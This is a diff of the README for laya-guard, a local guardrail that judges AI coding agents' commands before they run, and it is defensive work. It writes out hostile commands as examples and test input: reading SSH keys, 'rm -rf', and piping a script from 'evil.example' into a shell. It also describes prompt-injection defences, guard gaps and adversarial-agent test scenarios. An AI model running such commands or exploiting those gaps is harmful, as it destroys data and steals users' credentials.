@@ -1,20 +1,64 @@
-<p align="center"><img src="assets/logo.svg" width="128" alt="laya-guard logo"></p>
-
-# laya-guard — a free local guardrail for AI coding agents
-
-[![ci](https://github.com/scs0209/laya-guard/actions/workflows/ci.yml/badge.svg)](https://github.com/scs0209/laya-guard/actions/workflows/ci.yml)
-[![license: MIT](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
-[![python: >=3.10](https://img.shields.io/badge/python-%3E%3D3.10-blue.svg)](pyproject.toml)
-[![pypi](https://img.shields.io/pypi/v/laya-guardrail.svg)](https://pypi.org/project/laya-guardrail/)
-
 <p align="center">
-  <strong>English</strong> · <a href="README.ko.md">한국어</a>
+  <img src="assets/logo.svg" width="120" alt="laya-guard">
 </p>
 
-> **Your coding agent can run `cat ~/.ssh/id_rsa`, `curl … | sh` or `rm -rf ~` on your machine. laya-guard answers
-> *before* the command runs: block it, ask you, or let it through. Free, on your laptop, in ~0.1 s.**
+<h1 align="center">laya-guard</h1>
 
-<p align="center"><img src="demo/hero_en.gif" width="750" alt="laya-guard blocks cat ~/.ssh/id_rsa, curl | sh and rm -rf ~, and lets pytest through"></p>
+<p align="center">
+  <b>Every tool call, judged before it runs.</b><br>
+  A free, local guardrail for AI coding agents.
+</p>
+
+<p align="center">
+  <a href="https://github.com/scs0209/laya-guard/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/scs0209/laya-guard/actions/workflows/ci.yml/badge.svg"></a>
+  <a href="https://pypi.org/project/laya-guardrail/"><img alt="PyPI" src="https://img.shields.io/pypi/v/laya-guardrail.svg?style=flat-square"></a>
+  <a href="pyproject.toml"><img alt="Python 3.10+" src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square"></a>
+  <a href="LICENSE"><img alt="MIT License" src="https://img.shields.io/badge/license-MIT-2ecc71?style=flat-square"></a>
+  <img alt="macOS · Linux" src="https://img.shields.io/badge/macOS%20·%20Linux-555?style=flat-square">
+</p>
+
+<p align="center">
+  <a href="#-quick-start"><b>Quick start</b></a> ·
+  <a href="#-supported-agents"><b>Supported agents</b></a> ·
+  <a href="docs/guide/dashboard.md">Dashboard</a> ·
+  <a href="docs/guide/how-it-works.md">How it works</a> ·
+  <a href="#-benchmarks">Benchmarks</a> ·
+  <a href="README.ko.md">한국어</a>
+</p>
+
+<p align="center">
+  <img src="demo/hero_en.gif" width="750" alt="laya-guard blocks cat ~/.ssh/id_rsa, curl | sh and rm -rf ~, and lets pytest through">
+</p>
+
+---
+
+Your coding agent can run `cat ~/.ssh/id_rsa`, `curl … | sh` or `rm -rf ~` on your machine. laya-guard answers
+**before** the command runs: **block** it, **ask** you, or **let it through**. A regex prefilter catches the
+known-dangerous patterns and a small multilingual model (Laya, ~322M, Apache-2.0) judges the rest, on your laptop, in
+about 0.1 s.
+
+Free and MIT-licensed. No API key, no per-call billing, and the verdict log never stores the command text.
+
+## ✨ Why laya-guard
+
+| | |
+|---|---|
+| 🛑 **Judged before it runs** | Every command your agent proposes gets `allow`, `review` (you're asked) or `block`, with the policy and the reason. A chain like `npm test && curl … \| sh` is split, and the worst part wins. |
+| 💻 **Local and free** | Regex hits and safe commands return instantly. Everything else goes to a ~322M model on your CPU, about 85–90 ms per judgment. |
+| 🔌 **11 agents, one command** | `laya-guard install <agent>` shows the diff first, backs up your settings, then sends two test calls through the hook. |
+| 🔐 **Protects your files** | With `--files`, Claude Code's `Read`, `Edit` and `Write` are checked against protected paths: credential stores, `.env*`, private keys, shell startup files, `.git/hooks`. |
+| 👣 **Shows what agents touched** | An opt-in log of the files tool calls named, an optional macOS monitor for what scripts really opened, and `laya-guard footprint` to sum it up and suggest paths to protect. |
+| 🧯 **Keeps working when the server is down** | Hooks fall back to an offline regex check, and what it can't judge goes to you (or is blocked where nobody can be asked). |
+| 📊 **A dashboard on localhost** | See the verdicts, install hooks with a click, and watch calls move through the pipeline in a 3D simulation. |
+
+<p align="center">
+<picture>
+  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-light.png">
+  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-dark.png" width="820" alt="The laya-guard dashboard: verdict counts, a tape of recent calls, and which agents are protected">
+</picture>
+</p>
+
+## 🚀 Quick start
 
 **Try it in 10 seconds** (no model, no server, no hook; this is what the demo above runs):
 
@@ -23,20 +67,141 @@ pip install --no-deps laya-guardrail pyyaml
 laya-guard check --offline "cat ~/.ssh/id_rsa"     # [BLOCK] ... policy=credential-read
 ```
 
-**Use it with your agent** (Claude Code, Codex CLI, Cursor, Gemini CLI and seven more):
+**Use it with your agent:**
 
 ```bash
 pip install laya-guardrail          # the PyPI name; the command it installs is `laya-guard`
+laya-guard serve                    # loads the model, then listens on localhost:8787
 laya-guard install claude-code      # shows a diff first, backs up your settings, then checks the hook
+laya-guard dashboard                # or do it with a click, and see what the guard is doing
 ```
 
-(`pip install laya-guard` is an unrelated project: the package is **`laya-guardrail`**.)
+> **The package is `laya-guardrail`.** `pip install laya-guard` installs an unrelated project
+> ([dockndevai/laya-guard](https://pypi.org/project/laya-guard/)).
 
-AI coding agents run shell commands, move money, and ship data outward. Each step
-deserves a safety check — but per-decision API pricing makes per-step judging
-prohibitively expensive, so laya-guard judges every call **locally**, with no per-decision billing: a regex
-prefilter for known-dangerous patterns and a small multilingual model (Laya, ~322M, Apache-2.0) for everything
-else → `allow` / `review` / `block`.
+Requires Python ≥ 3.10. The model runtime pulls in PyTorch + transformers (hundreds of MB to a few GB depending on
+platform), and the ~322M checkpoint downloads on the first `serve`. `laya-guard service install` starts the server at
+every login ([details](docs/guide/reliability.md#keep-it-running-and-hear-about-outages)).
+
+## 🔌 Supported agents
+
+| Agent | Install | `review` becomes |
+|---|---|---|
+| [Claude Code](guard-hook.sh) | `laya-guard install claude-code` | a permission prompt |
+| [Codex CLI](integrations/codex/) | `laya-guard install codex` | allow + a note |
+| [Cursor](integrations/cursor/) | `laya-guard install cursor` | a permission prompt |
+| [Gemini CLI](integrations/gemini/check.py) | `laya-guard install gemini-cli` | allow + a note |
+| [Qwen Code](integrations/qwen/check.py) | `laya-guard install qwen-code` | a permission prompt (deny when headless) |
+| [Windsurf](integrations/windsurf/guard.py) | `laya-guard install windsurf` | allow + a note |
+| [Copilot CLI](integrations/copilot/policy.py) | `laya-guard install copilot-cli` | a permission prompt (deny when headless) |
+| [Cline](integrations/cline/PreToolUse) | `laya-guard install cline` | passes |
+| [OpenCode](integrations/opencode/laya-guard.ts) | `laya-guard install opencode` | allow + a warning |
+| [Kilo Code](integrations/kilo/laya-guard.ts) | `laya-guard install kilo` | allow + a warning |
+| [Amp](integrations/amp/laya-guard.ts) | `laya-guard install amp` | allow + a note |
+
+Aider, Roo Code, Continue and Junie have no hook mechanism, so there is no adapter for them. What each `install` writes,
+what's left for you to do, and how to call the guard from your own agent loop over HTTP:
+**[Agents guide](docs/guide/agents.md)**.
+
+## 🔐 Files: protect, record, review
+
+The hooks judge commands out of the box. Four opt-in pieces cover files:
+
+```bash
+laya-guard install claude-code --files   # also check Claude Code's file tools (Read, Edit, Write, …) against protected paths
+laya-guard activity on                   # record the files your agents' tool calls name (paths only, never contents)
+laya-guard watch                         # macOS: add what the agents' own processes really opened (needs sudo)
+laya-guard footprint --suggest           # per project: what was touched, and protect.yaml entries worth a look
+```
+
+* **Protected paths.** Reading a credential store, a `.env*` file or a private key is reviewed, changing a credential
+  store is blocked, and writes to shell startup files, `.git/hooks` and the agent's own settings are reviewed. Add your
+  own rules in `~/.config/laya-guard/protect.yaml`. File tools are guarded for Claude Code so far.
+* **What it sees.** The hooks see the paths a tool call names. A file read inside a script or a child process reaches
+  only `watch`, which records it but can't block it.
+
+More in the **[Files guide](docs/guide/file-protection.md)**.
+
+## 📸 Screenshots
+
+| | |
+|---|---|
+| ![The Agents view](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-agents-dark.png) | ![The install sheet](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-install-sheet-dark.png) |
+| **Agents**: finds the coding agents on this machine and shows which ones have the hook | **Install sheet**: the exact diff, before anything is written |
+| ![The Calls view](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-calls-dark.png) | ![The simulation view](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-simulation-dark.png) |
+| **Calls**: every verdict with its policy, reason and timing, never the command text | **Simulation**: the pipeline as a 3D diorama, attack scenarios judged by the real evaluator |
+
+<p align="center">
+  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/ai-scenario-demo.gif" width="820" alt="A recorded AI scenario: laya-guard blocks a poisoned npm test, and a curl command is held for review and denied">
+</p>
+<p align="center"><sub><b>AI scenario</b>: describe a situation, your own Claude Code plays the agent in a virtual repository, and every
+command it proposes is judged by the real evaluator. Nothing is run. The screenshots use made-up data.
+<a href="docs/guide/dashboard.md">Dashboard guide</a></sub></p>
+
+## 📊 Benchmarks
+
+| Suite | Result | Command |
+|---|---|---|
+| AgentDojo v1, attacks (judge-level) | **25/27 blocked** | `eval/run_agentdojo.py` |
+| AgentDojo v1, benign (judge-level) | **92/97 kept** (allow+review) | `eval/run_agentdojo.py` |
+| E2E rollout (qwen2.5:7b agent + guard) | **4/4 scenarios** (1 defended, 2 not attempted, 1 benign OK) | `eval/run_rollout.py` |
+| Shell commands (own set: 35 everyday + 36 dangerous/bypass) | **69/71** (real model) | `eval/run_eval.py --set shell` |
+| Korean 30 (own set) | **30/30** (mock **and** real) | `eval/run_eval.py` |
+
+The two in-house sets were written alongside the rules they test, so treat them as regression gates, not accuracy
+claims. AgentDojo is the external number, and it is self-reported and judge-level. The misses and what's behind each
+number: [Benchmarks in detail](docs/guide/how-it-works.md#benchmarks-reproducible-not-cherry-picked).
+
+## 🧠 How it works
+
+```
+agent tool_call
+  → your agent's hook (installed by `laya-guard install`)
+  → POST /guard (localhost:8787)
+  → chains (`a && b`, `a; b`, `a || b`) split, each command judged, the worst verdict wins
+  → policy.yaml: 12 regex policies
+      · block-level match   → instant block, model not consulted
+      · review-level match  → the model judges, floor is review
+      · safe command        → instant allow (ls, git status, npm test…)
+      · anything else       → the model judges freely
+  → Laya → allow / review / block
+```
+
+* **Rules first.** Twelve regex policies in [policy.yaml](src/laya_guard/policy.yaml) catch known patterns without
+  calling the model. Edit them or add your own, no code changes needed.
+* **A safe-command lane.** A single plain command with no shell metacharacters, risky flags or sensitive paths is
+  allowed instantly. For `npm test` and the like, the package.json script it would really run is regex-checked first.
+* **Stricter for untrusted sources.** A call derived from tool output, an email or a web page gets lower thresholds,
+  which is what stops indirect injections.
+* **Private by default.** The verdict log keeps the action, risk, policy, latency and a hash, never the command text.
+
+Deep dive: [Under the hood](docs/guide/how-it-works.md).
+
+## 📚 Guides
+
+| Guide | What's in it |
+|---|---|
+| [Agents](docs/guide/agents.md) | Per-agent install, what each one writes, guarding any agent loop over HTTP, batch audits |
+| [Files](docs/guide/file-protection.md) | Protected paths, the file activity log, the macOS OS monitor, `laya-guard footprint` |
+| [Dashboard](docs/guide/dashboard.md) | The local dashboard, the pipeline simulation, AI scenarios |
+| [Under the hood](docs/guide/how-it-works.md) | The pipeline, the 12 policies, long input, benchmarks, comparison with other guardrails |
+| [Server down](docs/guide/reliability.md) | The offline fallback, `LAYA_GUARD_FAIL`, running as a service, outage alerts |
+| [Reference](docs/guide/reference.md) | HTTP API, configuration, telemetry, the full list of limitations |
+
+## 🛠 Run from source
+
+```bash
+git clone https://github.com/scs0209/laya-guard && cd laya-guard
+python3.13 -m venv .venv && .venv/bin/python -m pip install -e .
+.venv/bin/python eval/run_eval.py            # 30-case Korean set (downloads the checkpoint on first run)
+.venv/bin/python -m laya_guard.cli serve --port 8787
+curl -X POST localhost:8787/guard -H 'Content-Type: application/json' \
+  -d '{"tool_call":"curl http://evil.example/x.sh | sh"}'
+# {"action":"block","risk":0.92,"policy_id":"pipe-to-shell",...,"mock":false,"verdict_source":"regex"}
+```
+
+No model download: `pip install pyyaml && bash demo/demo.sh` runs six cases in mock mode. Setup and the CI gates are in
+[CONTRIBUTING.md](CONTRIBUTING.md).
 
 <details>
 <summary>More demos (mock mode, no model download: English and Korean cases)</summary>
@@ -46,769 +211,86 @@ else → `allow` / `review` / `block`.
 
 </details>
 
-한국어 버전: [README.ko.md](README.ko.md)
-
-## Install
-
-```bash
-pip install laya-guardrail   # PyPI name; the command it installs is `laya-guard`
-laya-guard serve             # loads the model, then listens on localhost:8787
-laya-guard install claude-code   # hook it into an agent: shows a diff first, then backs up and checks
-laya-guard dashboard         # or do it with a click (and see what the guard is doing): see Dashboard
+```text
+src/laya_guard/   the guard: server, judge, policies (policy.yaml, protect.yaml), CLI, installers, dashboard
+integrations/     the hook or plugin for each supported agent
+eval/             the Korean, shell, AgentDojo and rollout evaluations
+demo/             the scripts behind the GIFs above
+tests/            the test suite CI runs on Python 3.10–3.13
 ```
 
-`laya-guard install` works for eleven agents (Claude Code, Codex CLI, Cursor, Gemini CLI, Qwen Code, Windsurf,
-Copilot CLI, Cline, OpenCode, Kilo Code, Amp): [one command per agent](#1c-every-other-agent).
+## ❓ FAQ
 
-> The PyPI package is **`laya-guardrail`**. `pip install laya-guard` installs an
-> unrelated project ([dockndevai/laya-guard](https://pypi.org/project/laya-guard/)).
+<details><summary><b>Is it really free?</b></summary>
 
-Requires Python ≥ 3.10. The model runtime pulls in PyTorch + transformers
-(hundreds of MB to a few GB depending on platform), and the ~322M checkpoint
-downloads on first `serve`. To try just the regex layer without any of that:
-`pip install --no-deps laya-guardrail pyyaml`, then
-`LAYA_GUARD_MOCK=1 laya-guard check "rm -rf /"`.
+Yes. MIT-licensed, and the model runs on your own machine: no API key, no account, no per-call billing. The one optional
+feature that calls an outside model is the dashboard's AI scenario, which runs the Claude Code you're already logged in
+to, under your own plan, and asks before its first use.
+</details>
 
-## Dashboard
+<details><summary><b><code>pip install laya-guard</code> installed something else.</b></summary>
 
-```bash
-laya-guard dashboard   # starts the server if it isn't running and opens http://127.0.0.1:8787/dashboard
-```
+That's an unrelated project. This one is published as **`laya-guardrail`**; the command it installs is `laya-guard`.
+</details>
 
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-light.png">
-  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-dark.png" width="860" alt="The laya-guard dashboard: verdict counts, a tape of recent calls, and which agents are protected">
-</picture>
-</p>
+<details><summary><b>Does it store my commands?</b></summary>
 
-A small app on your own machine (nothing leaves it) that shows what the guard is doing and protects your agents
-with a click. The screenshots use made-up data.
+No. Each verdict is logged locally with its action, risk, policy, latency and a truncated SHA-256, never the text.
+`LAYA_GUARD_LOG=0` turns the log off. The file activity log, which you have to switch on, stores file paths, never file
+contents.
+</details>
 
-- **Overview**: how many calls were judged and how they split, a tape with one fine line per call (blocks stand tall
-  and red; click one to open that call), and cards for what needs a look: an outline and a count when there are blocks or
-  reviews, and one card per agent that isn't protected yet.
-- **Agents**: it finds the coding agents on this machine by itself (an executable on `PATH`, an app bundle or a config
-  directory; read-only, it never opens those files) and shows whether each one has the hook. **Install hook** opens a
-  sheet with the exact diff. Nothing is written until you press **Apply change**; then the file is backed up, written
-  atomically, and two test calls go through the hook to check it. The blue button at the bottom of the sidebar installs
-  wherever the hook is missing.
+<details><summary><b>What happens when the server is down?</b></summary>
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-agents-dark.png" width="49%" alt="The Agents view: a tile per agent found on the machine, with a status dot">
-  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-install-sheet-dark.png" width="49%" alt="The install sheet: the exact diff to ~/.cursor/hooks.json before anything is written">
-</p>
+Every hook waits 10 seconds, then runs an offline check: regex matches are blocked, safe commands are allowed, and the
+rest goes to you, or is blocked by agents that can't ask. `LAYA_GUARD_FAIL=closed` blocks it, `open` lets it pass.
+[Server down](docs/guide/reliability.md)
+</details>
 
-- **Calls**: every judged call with its policy, reason, source, timing, length and hash (never the command text), with
-  a verdict filter and search.
-- **Policies**: which rules decided the calls.
+<details><summary><b>Can it stop a script from reading my secrets?</b></summary>
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-calls-dark.png" width="860" alt="The Calls view: a list of judged calls and the selected one on the right">
-</p>
+Not on its own. The hooks see the command and the paths a tool call names, so a file read inside a script or a child
+process never reaches them. On macOS, `laya-guard watch` records those reads from the OS, but it only reports.
+[Files guide](docs/guide/file-protection.md)
+</details>
 
-Keyboard: `j`/`k` move through the calls, `a` `r` `b` `0` filter by verdict, `1`-`5` pick the window, `/` search, `p`
-pause, `?` help. Light and dark follow your system. It only answers requests whose `Host` is loopback (DNS rebinding),
-loads nothing from the network, and shows hashes and lengths, never the text of a command. The one place it writes a
-file is the install sheet, so that endpoint asks for more: a same-origin `Origin`, a JSON body, a per-process token only
-the page carries, and the id of the diff you were shown (if the file changed since, you review it again). It changes
-the user scope only; use `laya-guard install --scope project` for a project. `--no-open` prints the URL instead of
-opening a browser.
+<details><summary><b>Does it work on Windows?</b></summary>
 
-## Simulation
+Not yet. The Claude Code hook is a bash script, and the background service is a macOS LaunchAgent or a Linux systemd
+unit.
+</details>
 
-Open **Simulation** in the dashboard's sidebar (`laya-guard dashboard`, then the second entry) to watch the pipeline
-work: a small isometric diorama (built in the page with three.js, no models or assets to download) where each call
-leaves an agent terminal, reaches the local guard, passes the **policy gate**, goes to the **Laya engine** only if the
-rules didn't decide it, and ends in the execution zone (allow), the review queue or the incident and audit area.
+<details><summary><b>How is it different from other guardrails?</b></summary>
 
-<p align="center">
-<picture>
-  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-simulation-light.png">
-  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-simulation-dark.png" width="860" alt="The simulation view: a 3D miniature of the pipeline with a scenario replaying in the policy gate, and the inspector showing the verdict the evaluator returned">
-</picture>
-</p>
+Most guardrails scan prompt text. laya-guard sits one step later and judges the tool call the agent is about to run,
+with a human-approval lane in between. [The comparison](docs/guide/how-it-works.md#how-it-compares)
+</details>
 
-What is drawn is always labelled by where it came from, and the three kinds are never styled alike:
+## ⚠️ Limitations
 
-| Label | What it is |
-|---|---|
-| `RECORDED` | A call read from your local verdict log (a hash and a length, never the command). New ones fly through as they arrive. |
-| `REAL` | An attack-lab scenario judged just now by this machine's evaluator: the policy rules and the local Laya model. |
-| `MOCK EVALUATOR` | The same, but the server runs in mock mode, so heuristics stand in for the model. The rules are still the real rules, and the result says which parts were which. |
-| `HEURISTIC FALLBACK` | The model was called on a scenario and failed, so regexes and heuristics stood in. |
-| `SIMULATION DATA` | Nothing was evaluated: the scenario's typical outcome, drawn for illustration. Used when you pick it, or when the server doesn't answer. |
+* **Declared access only.** The hooks see the command and the paths a tool call names. Code that a safe command runs
+  (test files, `conftest.py`, `build.rs`, Makefile recipes) isn't checked.
+* **Chains are judged part by part,** so the model doesn't see that `cd /etc` came before `cat shadow`.
+* **The numbers are self-reported.** AgentDojo results are judge-level, not end-to-end, and the model is tuned for
+  Korean-heavy input, so most of its overblocks are English prompts.
 
-- **Attack lab**: eight scenarios (a harmless `ls`, `rm -rf /`, a remote script piped into a shell, privilege
-  escalation, a secret upload, a package script, a chain that hides a dangerous command behind a harmless one, an
-  ambiguous deploy). A scenario is **judged, never run**: it goes through the evaluator only, a run isn't written to the
-  verdict log (so it isn't a call and doesn't move your numbers), and only the scenarios in the lab can be judged, never
-  free text. You see the verdict, risk score, policy and reason exactly as returned, which relevant policy checks matched,
-  who decided (rules or the model) and the stages it passed through. The **comparison table** keeps the latest run of
-  each scenario side by side.
-- **The scene is truthful, not decorative**: a call only enters the engine if the model was really called (it waits there
-  until the real answer arrives), a rules-decided call never goes near it, and the policy column of the matching
-  policy lights up. Nothing moves to look busy: with no calls there is no motion.
-- **Inspector**: click any terminal, the queue, a gate, a zone, a policy column or a call (or use the station buttons under
-  the scene, which do the same without 3D). The camera glides there, a ring marks it, and the panel shows what is known:
-  recorded counts, timings, the stage path of a call with a sentence for each stage. **Open in Calls** jumps to that call
-  in the Calls view.
-- **Replay**: play, pause, restart, step stage by stage, and scrub. Selecting a call replays it from its recorded stages.
-- **Controls**: drag pans, right-drag (or shift-drag) rotates, the wheel and a pinch zoom, arrows, `+` `-` `[` `]` `0` work
-  with the scene focused, and the same moves are buttons. A guided tour starts the first time and can be replayed.
-  Reduced-motion preferences remove the travel and make the camera jump. Without WebGL the same pipeline is shown as
-  cards.
+Read the [full list](docs/guide/reference.md#limitations-read-before-trusting-it) before trusting it.
 
-What it deliberately doesn't show: the evaluator returns a risk score and **no confidence value** and exposes no model
-reasoning, so none is drawn; the stages of a recorded call come from how the verdict was made (`via`), which is all the
-log keeps; laya-guard has no waiting line, so the "queue" is the moment between a call's arrival and its judgment; and the
-log doesn't say which agent made a call, so recorded calls are only spread over the two agent terminals by their hash.
+## 🤝 Contributing
 
-Under the hood: `GET /api/sim/config` (stages, policies, scenarios), `POST /api/sim/evaluate/<scenario>` (same token,
-origin and JSON checks as the installers; streams one NDJSON line per pipeline event, then the result) and `/static/...`
-for the page's modules and a tree-shaken, minified [three.js](https://threejs.org) r186 (MIT, `THREE_LICENSE.txt`),
-served read-only from inside the package. The page's CSP gains `'self'` for scripts and styles for that, and still allows
-no external host.
+PRs welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for setup, the CI gates and guidelines; open work is tracked in
+[GitHub Issues](https://github.com/scs0209/laya-guard/issues). The most useful report is a command that was judged
+wrong: use the Missed attack or Overblock issue form. Changes are logged in [CHANGELOG.md](CHANGELOG.md). Found a
+vulnerability in laya-guard itself? See [SECURITY.md](SECURITY.md) and please don't file it publicly. This project
+follows the [Contributor Covenant](CODE_OF_CONDUCT.md).
 
-### AI scenarios: describe any situation
+If laya-guard is useful to you, **a ⭐ on this repo helps more people find it.**
 
-The **AI scenario** tab (next to **Attack lab**) takes a situation in your own words, for example *"A coding agent is asked
-to clean up build artifacts in a monorepo, but its cleanup command is far too broad. Show how far it gets."* An AI agent
-interprets it, builds a small virtual repository, and then plays the coding agent step by step while the diorama shows what
-actually happens: it reads and writes the virtual files, and **every command it proposes is judged by the real laya-guard
-evaluator**. The verdict goes back to the agent, which adapts (another route, a message, giving up).
+<a href="https://star-history.com/#scs0209/laya-guard&Date">
+  <img src="https://api.star-history.com/svg?repos=scs0209/laya-guard&type=Date" width="600" alt="Star history">
+</a>
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/ai-scenario-demo.gif" width="860" alt="A recorded AI scenario: the agent reads and changes package.json in a virtual repository, laya-guard blocks npm test, a curl command is held for review and denied, and the outcome card separates the run's facts from the AI's account">
-</p>
-<p align="center"><sub>One run: a poisoned <code>npm test</code> script is blocked, a download is held and denied. Recorded with a scripted stand-in for the agent (so it can be repeated) and the mock evaluator; the labels on screen say so. A real agent takes a few seconds per decision.</sub></p>
+## 📄 License
 
-- **Your own agent, nothing to configure**: it runs the Claude Code you already have (`claude` on your PATH and logged
-  in) headless, once per decision. No API key, no hosted service, no Ollama, nothing to copy or paste. Only Claude Code is
-  wired in, because it is the one agent CLI with a switch that turns every tool off (`--tools ""`, plus no settings, hooks,
-  MCP servers, skills or saved session, in an empty temporary directory), so it can only answer in text. Gemini CLI,
-  Cursor and OpenCode have no such switch; `laya_guard.agentbridge.register()` is where another adapter would go.
-- **The loop**: interpret the prompt into a plan and virtual files, then up to *N* steps of *observe, ask the agent, validate,
-  apply*. The agent picks exactly one action per step from a fixed list (`read_file`, `write_file`, `list_dir`,
-  `run_command`, `message`, `finish`); anything that doesn't fit the schema is rejected and asked again (twice at most),
-  and the page shows the rejection. An allowed command is recorded as an inert execution, a **held** command waits for you
-  (**Approve** or **Deny**; no answer in 120 s means denied, or choose the policy up front), a blocked command is reported
-  back to the agent.
-- **Nothing is ever run**: the files exist only in memory, a command is only judged (in a throwaway directory holding the
-  virtual files, so a script the *agent* wrote into `package.json` is what gets read), an allowed command's "output" comes from the
-  virtual files for a few read-only commands (`ls`, `cat`, `pwd`, the text of an npm script) and is an `[inert]` notice for
-  everything else, and a run is never written to the verdict log or raises an alert.
-- **Controls, all in the window**: prompt box and examples, **Start**, live streaming, **Pause / Resume**, **Step** (or a
-  step-by-step run), **Stop**, **Run again** after editing the prompt, replay of earlier runs from this session, a history
-  of every action and decision (click a row: files and commands open in the Inspector), and an outcome card.
-- **What is whose**: `AI-GENERATED` is what the agent wrote (plan, actions, reasons, its account); `SIMULATED` is the
-  virtual world's bookkeeping; `REAL` or `MOCK EVALUATOR` is laya-guard's verdict; `ENGINE` is the run's own facts. The
-  outcome card keeps *From the run (facts)* apart from *The AI's account (not a measurement)*; its "if it had been allowed"
-  lines are hypotheses, and nothing was run, so none of it happened.
-- **Limits and cost**: 8 steps by default (up to 20), 10 minutes of working time (time spent paused or waiting for you
-  doesn't count, up to 30 minutes), $2 of reported cost, 120 s per decision, at most 14
-  files of 6000 characters, 2000 characters of prompt. Each decision is one Claude Code call under your own login and
-  plan: a typical 8-step run takes one to two minutes and cost about $0.05 to $0.15 with the cheap model in our checks.
-  Closing the tab doesn't stop a run: press **Stop**, or it ends at its limits or when the server exits (the agent process
-  goes with it).
-- **Consent**: the page asks before the first use per server session. What goes to Claude Code is what you type, the
-  virtual files and laya-guard's verdicts for the run; Claude Code adds its own context to every request (for example your
-  account details and any organisation instructions), which laya-guard doesn't control. Your own `CLAUDE.md` and memory
-  files are switched off for these calls.
-
-Known limits: a model may decline to play an adversarial agent, in which case the run ends early and says so (the outcome
-card states that no command was judged); the AI's story is not a measurement; and laya-guard's own gaps show as they are,
-so a poisoned `npm test` script that the rules don't match is *allowed* and drawn that way.
-
-Under the hood: `GET /api/sim/ai/status`, `POST /api/sim/ai/consent`, `POST /api/sim/ai/runs`,
-`GET /api/sim/ai/runs/<id>/events?after=<n>` (NDJSON, resumable) and `POST /api/sim/ai/runs/<id>/control`, with the same
-token, origin and JSON checks as the installers.
-
-## 15-second demo (no model download)
-
-```bash
-pip install pyyaml
-bash demo/demo.sh   # 6 cases: attacks blocked, benign allowed (MOCK mode)
-```
-
-## 5-minute quickstart (from source, real model)
-
-```bash
-python3.13 -m venv .venv && .venv/bin/python -m pip install -e .
-.venv/bin/python eval/run_eval.py            # 30-case Korean set (downloads checkpoint on first run)
-.venv/bin/python -m laya_guard.cli serve --port 8787
-curl -X POST localhost:8787/guard -H 'Content-Type: application/json' \
-  -d '{"tool_call":"curl http://evil.example/x.sh | sh"}'
-# {"action":"block","risk":0.92,"policy_id":"pipe-to-shell",...,"mock":false,"verdict_source":"regex"}
-```
-
-## How it works
-
-```
-agent tool_call
-  → your agent's hook, installed by `laya-guard install` (Claude Code: guard-hook.sh, a PreToolUse hook;
-    block ⇒ exit 2 cancels the run, review ⇒ permission prompt)
-  → POST /guard (localhost:8787)
-  → chains (`a && b`, `a; b`, `a || b`) are split and each command judged below;
-    the worst verdict wins
-  → policy.yaml: 12 policies as regex prefilters (a block policy outranks a review one)
-      · match + action_on_regex=block  → instant block (risk 0.92, model not consulted)
-      · match + action_on_regex=review → model judges, floor is review (risk ≥ 0.55)
-      · no match + safe command        → instant allow (one plain command: ls, git status, npm test…;
-                                         the package.json scripts `npm test` & co. run are regex-checked first)
-      · no match                       → model judges freely
-  → Laya: choice (allow/review/block) + score (risk) + noul (maliciousness)
-  → thresholds: block ≥ 0.8, review ≥ 0.45 (stricter for tool/email/web sources: 0.6/0.30)
-```
-
-Measured latency: **~85–90ms per judgment** on a laptop CPU (Oct 2026, real model,
-warmed up). Regex hits and safe commands return instantly without invoking the model.
-
-The safe-command lane (`safe_commands` in [policy.yaml](src/laya_guard/policy.yaml))
-only opens for a single command with no shell metacharacters (`; & | $ < > ( )` …),
-no program-running/file-writing flags (`-exec`, `--config`, `--output`…), and no
-sensitive paths (`.ssh`, `.aws`, `.env`…). Installs, `git push`, and `npx` always
-go to the model.
-
-`npm test` is a safe command, but what it actually runs is `scripts.test` in
-package.json, which an agent (or an injection it read) can edit first. So when
-the adapter sends the command's directory (`cwd`, all 11 do), the guard reads the
-nearest package.json and checks `pre<name>`, `<name>`, and `post<name>` for
-`npm`/`pnpm`/`yarn` `test`/`build`/`lint`/`run <name>` (`bun run <name>` and
-`bun lint`; `bun test`/`bun build` are bun's own tools). Nested `npm run` calls and
-`cd` inside chains are followed. Scripts are checked against the regex policies
-only, not the model: the model blocks ordinary scripts like `next build`, `vite
-build`, and `jest`. A hit blocks or reviews per its policy (`package.json
-scripts.test: …` in the reason). If it can't tell which scripts run (`--prefix`,
-`--filter`, `-w`, a lost `cd -`, nesting deeper than 3), the call goes to review.
-
-Chains are split only at top-level `;`, `&&`, `||`, and `&` (never inside quotes,
-`$(…)`, or parentheses), so `cd app && npm test` is two safe commands while
-`npm test && curl … | sh` is blocked by its second half. The whole string is still
-checked against the regexes, which catches patterns spanning commands
-(`curl -o x …; sh x`).
-
-## Supported agents
-
-| Agent | Install | Integration | `review` becomes |
-|---|---|---|---|
-| Claude Code | `laya-guard install claude-code` | [PreToolUse hook](guard-hook.sh) | `ask` (permission prompt; `LAYA_GUARD_REVIEW=pass` to pass through) |
-| Codex CLI | `laya-guard install codex` | [`PreToolUse` hook](integrations/codex/) | allow + stderr note (no ask lane) |
